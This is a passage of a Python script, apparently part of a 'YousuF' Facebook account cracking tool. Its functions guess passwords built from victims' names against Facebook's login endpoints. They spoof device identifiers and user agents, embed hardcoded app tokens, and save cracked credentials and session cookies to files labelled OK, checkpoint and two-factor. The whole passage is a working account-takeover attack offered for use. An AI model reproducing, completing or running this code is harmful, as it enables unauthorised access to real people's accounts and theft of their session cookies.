                                                open('/sdcard/YousuF/YousuF-FILE-2F.txt','a').write(ids+'|'+pas+'\n')                
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\33[1;37m│\033[1;30m[YousuF-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#[<─────────[FILE,M2]───────────>]#                         
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{LR}[{LG}YousuF{LR}]\033[1;37m<>\33[1;32m{LR}[{LG}M\033[1;37m1{LR}]\033[1;37m<>{LR}({LG}{loop}{LR}){LG}\033[1;37m<>\33[1;32mOK{W}/{R}CP\33[1;32m:{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US", # --> From Parsing User Agent
            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895", # --> Use App ID|Token/Sig
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"1d6bdac1d94b7eff5dfc99453b632a28"}
            head = {
            "User-Agent": YousuF2(),
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-connection-Token": "d29d67d37eca387482a8a5b740f84f62",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            }
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r{G}[YousuF-OK] {ids} | {pas}')
                open('/sdcard/YousuF-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#[<─────────[FILE,M3]───────────>]#     
def graph2(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\33[1;37m\33[1;37m[YousuF]\033[1;37m-\33[1;32m[M\033[1;37m1\33[1;32m]\033[1;37m<>\33[1;32m {cl}%s \033[1;37m<>\33[1;32mOK : %s '%(loop,len(oks)));sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/1.8.4;FBDM/{density=0.75,width=320,height=240};FBLC/ru_RU;FB_FW/1;FBCR/AT&amp-T;FBNP/com.facebook.katana;FBSV/2.1-update1;]"+"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/U.S.Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920R4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/69.0.0.2075;FBBV/4027810;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.865,width=720,height=1465};FBLC/pt_BR;FBRV/4578887127;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"                     
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sm=['GT-', 'SM-']
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers={'User-Agent':YousuF2(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\33[1;37m[YousuF]-[OK]\33[1;37m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/YousuF/YousuF-FILE-OK.txt','a').write(ids+'|'+pas+'\n')                
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[YousuF-2F] '+ids+' | '+pas)
                                                open('/sdcard/YousuF/YousuF-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                     #   if 'y' in pcp:
                                                print('\r\r\033[1;30m[YousuF-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YousuF/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                      #  else:
                                            #    open('/sdcard/YousuF/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                                              #  break
                                                #cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass	
#[<─────────[FILE,M4]───────────>]#     
def bapi(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{LR}[{LG}YousuF{LR}]\033[1;37m<>\33[1;32m{LR}[{LG}M\033[1;37m4{LR}]\033[1;37m<>{LR}({LG}{loop}{LR}){LG}\033[1;37m<>\33[1;32mOK{W}/{R}CP\33[1;32m:{len(oks)}{W}/{R}{len(cps)}')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(00,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android = str(random.randint(4,13))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = str(random.randint(111111111,999999999))
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data ={
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':YousuF2(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }                                
                        url = 'https://b-api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:                                     
                                        print(f'\r\33[1;37m[YousuF]-[OK]\33[1;37m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/YousuF/YousuF-FILE-OK.txt','a').write(ids+'|'+pas+'\n')                
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[YousuF-2F] '+ids+' | '+pas)
                                                open('/sdcard/YousuF/YousuF-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break                                                                                                                     
                        elif 'www.facebook.com' in po['error_msg']:                            
                                        if 'y' in pcp:
                                                print('\r\r\033[1;37m[YousuF-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YousuF/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/YousuF/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass


   

menu()












